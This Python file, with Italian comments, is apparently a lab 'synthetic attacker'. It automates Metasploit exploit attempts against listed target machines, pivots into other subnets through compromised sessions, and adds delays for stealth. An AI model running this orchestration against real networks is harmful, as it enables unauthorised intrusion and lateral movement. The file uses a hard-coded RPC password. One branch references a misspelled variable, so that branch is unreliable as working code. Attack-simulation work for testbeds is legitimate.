import json
import random
import ipaddress
from MetaClient import MetaClient
from util import Logger,Constants as C
from attack import Attack,MetasploitAttack,SshAttack,NotImplementedAttack,Attack_DB
import sequence_loader 
from time import sleep


def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=False, stealth_sleep=0):

    Logger.init_logger()

    #Vengono estratte dal file di configurazione le informazioni sulle macchine target
    with open(config_file) as f:
        target_list = json.load(f)
    machines = []
    other_subnet = dict()
    for ip in target_list["targets"]:
        machines.append(ip["target"])
        if "other_subnet" in ip:
            other_subnet.update({ip["target"]: ip["other_subnet"]})

    router = None
    OOBSession = None
    atk_sess = None
    compromised_machines = {attacker_ip}
    uncompromised_machines = set(machines)

    #Viene inizializzato il client Metasploit e viene caricato il database
    mc = MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
    attack_db = Attack_DB(mc, attacker_ip, OOBSession)


    #CASO 0: PROCEDURA IN ORDINE CASUALE
    if not attack_sequence_file:
        print(f"{C.COL_YELLOW}\nAttacking with random attack sequence{C.COL_RESET}")
        
        #Vengono estratte ed attaccate, una ad una, tutte le macchine target
        while machines:
            target_ip = machines.pop(0)
            print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")

            #Viene generata una sequenza casuale di attacchi per la macchina in esame
            attack_sequence_list = list(attack_db.attack_dict)
            attack_sequence_list = random.sample(attack_sequence_list, len(attack_sequence_list))

            if atk_sess:
                met_sess = mc.upgrade_shell(atk_sess)

            if target_ip in other_subnet:
                if atk_sess is None:
                    print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}")
                    return
                else:
                    print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
                    mc.route_add(met_sess["id_sess"], target_ip)
                    router = met_sess
            
            #Vengono iterati gli attacchi della sequenza casuale e vengono sferrati fino a quando uno non ha successo
            attack_sequence_index = 0
            while attack_sequence_index < len(attack_sequence_list):
                attack_name = attack_sequence_list[attack_sequence_index]
                attack_sequence_index += 1

                LPORT = None
                for p in C.TARGETS_DOCKERS[target_ip]:
                    LPORT = p["exposed_port"]
                    break

                print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")

                attack_obj = attack_db.create_attack(attack_name, target_ip, attacker_ip, LPORT)

                if isinstance(attack_obj, SshAttack) and OOBSession is None:
                    print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                    continue

                session = mc.attempt_attack(attack_obj)

                if isinstance(attack_obj, NotImplementedAttack):
                    print(f"{C.COL_RED}[-] attack not implemented")

                elif session:
                    #si controlla che il successo dell'attacco non sia un falso positivo
                    if session[0] == target_ip:
                        atk_sess = session[1:2][0]["id_sess"]
                        print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
                        compromised_machines.add(target_ip)
                        uncompromised_machines.remove(target_ip)

                        break
                    else:
                        print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
                else:
                    uncompromised_machines.add(target_ip)
                    print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")


                if stealth_sleep:
                    print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                    sleep(stealth_sleep)

            print(f"{C.COL_GREEN}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")

    elif(attack_sequence_file == "new_attack_sequence.json"):
        print(f"{C.COL_YELLOW}\nReading attack sequence from Attack_sequence.json and attacking with that")
        print(f"{C.COL_YELLOW}ATTACK SEQUENCE:")
          
        # Viene estratta la sequenza di attacchi dalla funzione del modulo sequence_loader
        attack_seuence = sequence_loader.load_attack_sequence(attack_sequence_file)
        sequence_loader.print_attack_sequence(attack_sequence_file)

        # Itera direttamente su ogni step della sequenza di attacco
        for i, (attack_name, target_ip, other_attribute) in enumerate(attack_sequence, start=1):
            print(f"{C.COL_GREEN}[STEP {i}] Attacking IP: {target_ip} with {attack_name}{C.COL_RESET}")
            
            if atk_sess:
                met_sess = mc.upgrade_shell(atk_sess)

            # Gestione di una subnet diversa
            if target_ip in other_subnet:
                if atk_sess is None:
                    print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}")
                    return
                else:
                    print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
                    mc.route_add(met_sess["id_sess"], target_ip)
                    router = met_sess

            # Estrae la porta LPORT per il target corrente
            LPORT = None
            for p in C.TARGETS_DOCKERS.get(target_ip, []):
                LPORT = p["exposed_port"]
                break

            # Crea l'oggetto dell'attacco e lo esegue
            print(f"{C.COL_GREEN}[+] Initiating attack {attack_name} on {target_ip} with attribute: {other_attribute if other_attribute else 'N/A'}{C.COL_RESET}")
            attack_obj = attack_db.create_attack(attack_name, target_ip, attacker_ip, LPORT)

            if isinstance(attack_obj, SshAttack) and OOBSession is None:
                print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                continue

            session = mc.attempt_attack(attack_obj)

            # Gestione dei risultati dell'attacco
            if isinstance(attack_obj, NotImplementedAttack):
                print(f"{C.COL_RED}[-] attack not implemented")
            elif session:
                atk_sess = session[1:2][0]["id_sess"]
                print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
                compromised_machines.add(target_ip)
                if target_ip in uncompromised_machines:
                    uncompromised_machines.remove(target_ip)
            else:
                print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")

            # Pausa stealth opzionale tra gli attacchi
            if stealth_sleep:
                print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                sleep(stealth_sleep)

            # Separatore per chiarezza nel log degli attacchi
            print(f"{C.COL_GREEN}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")


        
    

    #CASO 1: PROCEDURA CON ORDINE LETTO DA FILE
    else:

        print(f"{C.COL_YELLOW}\nReading attack sequence from Attack_sequence.json and attacking with that")
        print(f"{C.COL_YELLOW}ATTACK SEQUENCE:")
        #Viene estratta dal file la sequenza di attacchi da utilizzare durante la procedura
        with open(attack_sequence_file) as f:
            attack_data = json.load(f)['attack_sequence']
        attack_sequence = []

        for ip, attacks in attack_data.items():
            if ip == '' or ip not in uncompromised_machines:
                continue  
            print(f"{C.COL_YELLOW}{ip}: {attacks}")
            for attack in attacks:
                attack_sequence.append((ip, attack))

        visited_ips=set()

        #Vengono iterati tutti gli ip presenti nel file di input e li si prova ad attaccare con tutti gli attacchi ad essi destinati
        for target_ip, attack_name in attack_sequence:
            if target_ip in visited_ips:
                continue
            print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
            visited_ips.add(target_ip)

            if atk_sess:
                met_sess = mc.upgrade_shell(atk_sess)

            if target_ip in other_subnet:
                if atk_sess is None:
                    print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}")
                    return
                else:
                    print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
                    mc.route_add(met_sess["id_sess"], target_ip)
                    router = met_sess

            LPORT = None
            for p in C.TARGETS_DOCKERS[target_ip]:
                LPORT = p["exposed_port"]
                break

            #Vengono eseguiti tutti gli attacchi sull'ip corrente prima di passare al successivo
            for attack in [a for ip, a in attack_sequence if ip == target_ip]:
                print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack}{C.COL_RESET}")
                attack_obj = attack_db.create_attack(attack, target_ip, attacker_ip, LPORT)

                if isinstance(attack_obj, SshAttack) and OOBSession is None:
                    print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                    continue

                session = mc.attempt_attack(attack_obj)

                if isinstance(attack_obj, NotImplementedAttack):
                    print(f"{C.COL_RED}[-] attack not implemented")

                elif session:
                    atk_sess = session[1:2][0]["id_sess"]
                    print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
                    compromised_machines.add(target_ip)
                    if target_ip in uncompromised_machines:
                        uncompromised_machines.remove(target_ip)

                else:
                    uncompromised_machines.add(target_ip)
                    print(f"{C.COL_RED}[-] xx Exploit failed {C.COL_RESET}")

                if stealth_sleep:
                    print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                    sleep(stealth_sleep)

            print(f"{C.COL_GREEN}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")

         

    print(f"{C.COL_GREEN} Attack complete!! {C.COL_RESET}")


#Da config.json viene recuperato l'ip dell'attaccante e lo si passa al main insieme a config.json
#Come terzo parametro si può passare un file json contenente la sequenza degli attacchi da eseguire
#Se non viene passato gli attacchi vengono effettuati in ordine casuale fino a quando uno non va a buon fine
if(__name__=='__main__'):
    mode = -1
    while (mode!=0 and mode!=1 and mode!=2):
        mode = int(input("\nHow do you want to execute the synthetic attacker?\n[0] : with random attack sequence\n[1] : with attack sequence read from json file\nPress 0 or 1 :   "))
        if(mode!=0 and mode!=1 and mode!=2):
            print("Invalid choice, press 0 or 1")
    if(mode==0):
        main_procedure(C.ATTACKER_VM,"config.json")
    elif(mode==1):
        main_procedure(C.ATTACKER_VM,"config.json", "Attack_sequence.json")
    else:
        main_procedure(C.ATTACKER_VM,"config.json", "new_attack_sequence.json")